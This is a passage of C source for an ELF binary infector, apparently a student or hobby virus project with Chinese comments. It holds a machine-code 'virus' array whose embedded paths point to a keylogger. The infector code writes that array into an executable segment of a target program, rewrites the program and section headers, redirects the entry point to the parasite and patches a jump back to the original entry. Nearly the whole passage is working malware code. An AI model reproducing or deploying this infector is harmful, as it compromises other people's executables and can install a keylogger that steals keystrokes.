,0x48,0x89,0xe5,0x48,0x81,0xec,0x90,0x10,0x00,0x00,0x64,0x48,0x8b,0x04,0x25,0x28
,0x00,0x00,0x00,0x48,0x89,0x45,0xf8,0x31,0xc0,0xc6,0x85,0xa0,0xef,0xff,0xff,0x52
,0xc6,0x85,0xa1,0xef,0xff,0xff,0x6f,0xc6,0x85,0xa2,0xef,0xff,0xff,0x74,0xc6,0x85
,0xa3,0xef,0xff,0xff,0x61,0xc6,0x85,0xa4,0xef,0xff,0xff,0x69,0xc6,0x85,0xa5,0xef
,0xff,0xff,0x6e,0xc6,0x85,0xa6,0xef,0xff,0xff,0x6d,0xc6,0x85,0xa7,0xef,0xff,0xff
,0x72,0xc6,0x85,0xa8,0xef,0xff,0xff,0x65,0xc6,0x85,0xa9,0xef,0xff,0xff,0x74,0xc6
,0x85,0xaa,0xef,0xff,0xff,0x21,0xc6,0x85,0xab,0xef,0xff,0xff,0x0a,0xc6,0x85,0xb0
,0xef,0xff,0xff,0x2f,0xc6,0x85,0xb1,0xef,0xff,0xff,0x68,0xc6,0x85,0xb2,0xef,0xff
,0xff,0x6f,0xc6,0x85,0xb3,0xef,0xff,0xff,0x6d,0xc6,0x85,0xb4,0xef,0xff,0xff,0x65
,0xc6,0x85,0xb5,0xef,0xff,0xff,0x2f,0xc6,0x85,0xb6,0xef,0xff,0xff,0x73,0xc6,0x85
,0xb7,0xef,0xff,0xff,0x75,0xc6,0x85,0xb8,0xef,0xff,0xff,0x6e,0xc6,0x85,0xb9,0xef
,0xff,0xff,0x2f,0xc6,0x85,0xba,0xef,0xff,0xff,0x44,0xc6,0x85,0xbb,0xef,0xff,0xff
,0x65,0xc6,0x85,0xbc,0xef,0xff,0xff,0x73,0xc6,0x85,0xbd,0xef,0xff,0xff,0x6b,0xc6
,0x85,0xbe,0xef,0xff,0xff,0x74,0xc6,0x85,0xbf,0xef,0xff,0xff,0x6f,0xc6,0x85,0xc0
,0xef,0xff,0xff,0x70,0xc6,0x85,0xc1,0xef,0xff,0xff,0x2f,0xc6,0x85,0xc2,0xef,0xff
,0xff,0x52,0xc6,0x85,0xc3,0xef,0xff,0xff,0x6f,0xc6,0x85,0xc4,0xef,0xff,0xff,0x74
,0xc6,0x85,0xc5,0xef,0xff,0xff,0x61,0xc6,0x85,0xc6,0xef,0xff,0xff,0x6e,0xc6,0x85
,0xc7,0xef,0xff,0xff,0x69,0xc6,0x85,0xc8,0xef,0xff,0xff,0x6d,0xc6,0x85,0xc9,0xef
,0xff,0xff,0x72,0xc6,0x85,0xca,0xef,0xff,0xff,0x65,0xc6,0x85,0xcb,0xef,0xff,0xff
,0x74,0xc6,0x85,0xcc,0xef,0xff,0xff,0x2f,0xc6,0x85,0xcd,0xef,0xff,0xff,0x73,0xc6
,0x85,0xce,0xef,0xff,0xff,0x6b,0xc6,0x85,0xcf,0xef,0xff,0xff,0x65,0xc6,0x85,0xd0
,0xef,0xff,0xff,0x79,0xc6,0x85,0xd1,0xef,0xff,0xff,0x6c,0xc6,0x85,0xd2,0xef,0xff
,0xff,0x6f,0xc6,0x85,0xd3,0xef,0xff,0xff,0x67,0xc6,0x85,0xd4,0xef,0xff,0xff,0x67
,0xc6,0x85,0xd5,0xef,0xff,0xff,0x65,0xc6,0x85,0xd6,0xef,0xff,0xff,0x72,0xc6,0x85
,0xd7,0xef,0xff,0xff,0x2f,0xc6,0x85,0xd8,0xef,0xff,0xff,0x73,0xc6,0x85,0xd9,0xef
,0xff,0xff,0x6b,0xc6,0x85,0xda,0xef,0xff,0xff,0x6c,0xb8,0x00,0x00,0x00,0x00,0xe8
,0xd4,0xfd,0xff,0xff,0x89,0x85,0x74,0xef,0xff,0xff,0x83,0xbd,0x74,0xef,0xff,0xff
,0x00,0x75,0x16,0x48,0x8d,0x85,0xb0,0xef,0xff,0xff,0xbe,0x00,0x00,0x00,0x00,0x48
,0x89,0xc7,0xe8,0xeb,0xfd,0xff,0xff,0xeb,0x14,0x48,0x8d,0x85,0xa0,0xef,0xff,0xff
,0xbe,0x0c,0x00,0x00,0x00,0x48,0x89,0xc7,0xe8,0xd9,0xf3,0xff,0xff,0x48,0x8d,0x85
,0x90,0xef,0xff,0xff,0xc7,0x00,0x2e,0x00,0x00,0x00,0x48,0x8d,0x85,0x90,0xef,0xff
,0xff,0xba,0x00,0x00,0x00,0x00,0xbe,0x00,0x00,0x00,0x00,0x48,0x89,0xc7,0xe8,0x51
,0xf1,0xff,0xff,0x48,0x89,0x85,0x78,0xef,0xff,0xff,0x48,0x8d,0x8d,0xf0,0xef,0xff
,0xff,0x48,0x8b,0xbd,0x78,0xef,0xff,0xff,0x48,0x89,0xce,0x48,0xc7,0xc2,0x00,0x10
,0x00,0x00,0x48,0xc7,0xc0,0xd9,0x00,0x00,0x00,0x0f,0x05,0x48,0x89,0x85,0x80,0xef
,0xff,0xff,0xc7,0x85,0x70,0xef,0xff,0xff,0x00,0x00,0x00,0x00,0xeb,0x44,0x8b,0x85
,0x70,0xef,0xff,0xff,0x48,0x98,0x48,0x8d,0x95,0xf0,0xef,0xff,0xff,0x48,0x01,0xd0
,0x48,0x89,0x85,0x88,0xef,0xff,0xff,0x48,0x8b,0x85,0x88,0xef,0xff,0xff,0x48,0x83
,0xc0,0x12,0x48,0x83,0xc0,0x01,0x48,0x89,0xc7,0xe8,0x63,0xf8,0xff,0xff,0x48,0x8b
,0x85,0x88,0xef,0xff,0xff,0x0f,0xb7,0x40,0x10,0x0f,0xb7,0xc0,0x01,0x85,0x70,0xef
,0xff,0xff,0x8b,0x85,0x70,0xef,0xff,0xff,0x48,0x63,0xd0,0x48,0x8b,0x85,0x80,0xef
,0xff,0xff,0x48,0x39,0xc2,0x7c,0xa7,0x48,0x8b,0x85,0x80,0xef,0xff,0xff,0x48,0x85
,0xc0,0x0f,0x85,0x63,0xff,0xff,0xff,0x48,0x8b,0x85,0x78,0xef,0xff,0xff,0x48,0x89
,0xc7,0xe8,0x2a,0xf0,0xff,0xff,0x90,0xe8,0x00,0x00,0x00,0x00
};

/**/
char *elf_file;
int fd, file_size;

//Map the target to array, Easy to edit
static void* filemap(char *location)
{
	FILE *append_f = fopen(location, "a");
	int zero = 0, i;
	for(i = 0; i < APPEND_NUM; ++i)
		fwrite(&zero, 1, 1, append_f); //append 100000 zeros for moving
	fclose(append_f);
    struct stat stat;
    void *ptr;
    fd = open(location, O_RDWR);
    fstat(fd, &stat);
    file_size = stat.st_size;
    ptr = mmap(NULL, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	return ptr;
}

int intersect(int al, int ar, int bl, int br)
{
	if(al >= bl && al <= br)
		return 1;
	if(ar >= bl && ar <= br)
		return 1;
	if(bl >= al && bl <= ar)
		return 1;
	if(br >= al && br <= ar)
		return 1;
	return 0;
}

int find_segments(Elf64_Shdr *shdr, Elf64_Ehdr *ehdr, Elf64_Phdr *phdr)
{
	int pcount = ehdr->e_phnum, scount = ehdr->e_shnum;
	int desired_v_begin, desired_v_end;
	int desired_f_begin, desired_f_end;
	int i, j;
	int loc = -1;
	for (i = 0; i < pcount; ++i)
	{
		//寻找可执行的段。PF是用二进制数表示的，因此用&来判断
		if (phdr[i].p_filesz > 0 && phdr[i].p_filesz == phdr[i].p_memsz
			&& (phdr[i].p_flags & PF_X))
		{
			//划定插入代码的位置
			desired_v_begin = phdr[i].p_vaddr + phdr[i].p_memsz;
			desired_v_end = phdr[i].p_vaddr + phdr[i].p_memsz + sizeof virus - 1;
			for (j = 0; j < pcount; ++j)
			{
				//如果病毒的范围和其他段有交叠，则退出(导致loc没有修改，后续步骤退出)
				if (intersect(phdr[j].p_vaddr, phdr[j].p_vaddr + phdr[j].p_memsz - 1, desired_v_begin, desired_v_end))
					break;
			}
			//发现没有交叠，loc为找到的要插入的位置。
			if (j == pcount)
			{
				loc = i;
				break;
			}
		}
	}

	//寄生代码的偏移地址
	desired_f_begin = phdr[loc].p_filesz + phdr[loc].p_offset;
	desired_f_end = desired_f_begin + sizeof virus - 1;
	//int occupied_size = sizeof virus;
	//移动寄生代码后面的数据，腾出空间
	int len = file_size;
	for (i = len - APPEND_NUM - 1; i >= desired_f_begin; --i)
		elf_file[i + APPEND_NUM] = elf_file[i];
	shdr += APPEND_NUM / (sizeof *shdr);
	for (i = 0; i < pcount; ++i)
	{
		//对在寄生代码之后的段偏移进行修改
		if (phdr[i].p_offset >= desired_f_begin)
		{
			phdr[i].p_offset += APPEND_NUM;
		}
		//扩大被寄生段的尺寸
		else if (phdr[i].p_offset + phdr[i].p_filesz > desired_f_begin)
		{
			phdr[i].p_filesz += APPEND_NUM;
		}
	}
	for (i = 0; i < scount; ++i)
	{
		//对在寄生代码之后的节偏移进行修改
		if (shdr[i].sh_offset >= desired_f_begin)
			shdr[i].sh_offset += APPEND_NUM;
		else if (shdr[i].sh_offset + shdr[i].sh_size > desired_f_begin)
		{
			fprintf(stderr, "miemiemie\n");
		}
	}
	//移动文件头
	ehdr->e_shoff += APPEND_NUM;
	return loc;
}

//To insert code into file
//To do this, we have to insert the code to destination, and modify program
//header, then modify the entry point
static int insert_code(Elf64_Ehdr *ehdr)
{
	Elf64_Shdr *shdr = (Elf64_Shdr *)(elf_file + ehdr->e_shoff);
	Elf64_Phdr *phdr = (Elf64_Phdr *)(elf_file + ehdr->e_phoff);
	//int len = strlen(virus);
	int loc = find_segments(shdr, ehdr, phdr);

	//改变跳转指令，跳回寄主文件的入口地址
	*(Elf64_Word*)(virus + sizeof virus - 4) = (Elf64_Word)ehdr->e_entry - (phdr[loc].p_vaddr + phdr[loc].p_filesz + sizeof virus);
#define entryDelta 3360
	//修改入口地址到寄生代码的main函数
	ehdr->e_entry = phdr[loc].p_vaddr + phdr[loc].p_filesz + entryDelta;
	//写入寄生代码
	memcpy(elf_file + phdr[loc].p_offset + phdr[loc].p_filesz, virus, sizeof virus);

	//修改*virus，定位寄生代码在文件中的位置
#define myConstant1 2291
	* (long long*)(&elf_file[phdr[loc].p_offset + phdr[loc].p_filesz + myConstant1]) = phdr[loc].p_vaddr + phdr[loc].p_filesz;

	//改变段头
	phdr[loc].p_filesz += sizeof virus;
	phdr[loc].p_memsz += sizeof virus;

	close(fd);
	return 0;
}

int main(int argc, char *argv[])
{
	getsysroot(argc, argv);

	printf("[*] Infecting...\n");
	Elf64_Ehdr *ehdr;
	//char *names;

	elf_file = (char*)filemap(argv[1]);
	ehdr = (Elf64_Ehdr*)elf_file;
	int status = insert_code(ehdr);
	
	if(status == 0)
	{
		char str[256];
		memcpy(str, argv[1], sizeof argv[1]);

		int len = strlen(str);   //The symbol ".infect"
		str[len] = '.';
		str[len + 1] = 'i';
		str[len + 2] = 'n';
		str[len + 3] = 'f';
		str[len + 4] = 'e';
		str[len + 5] = 'c';
		str[len + 6] = 't';
		str[len + 7] = 0;
		open(str, O_CREAT | O_RDWR, 777);
	}
	printf("[*] Infect Successfully!\n");
	return 0;
}
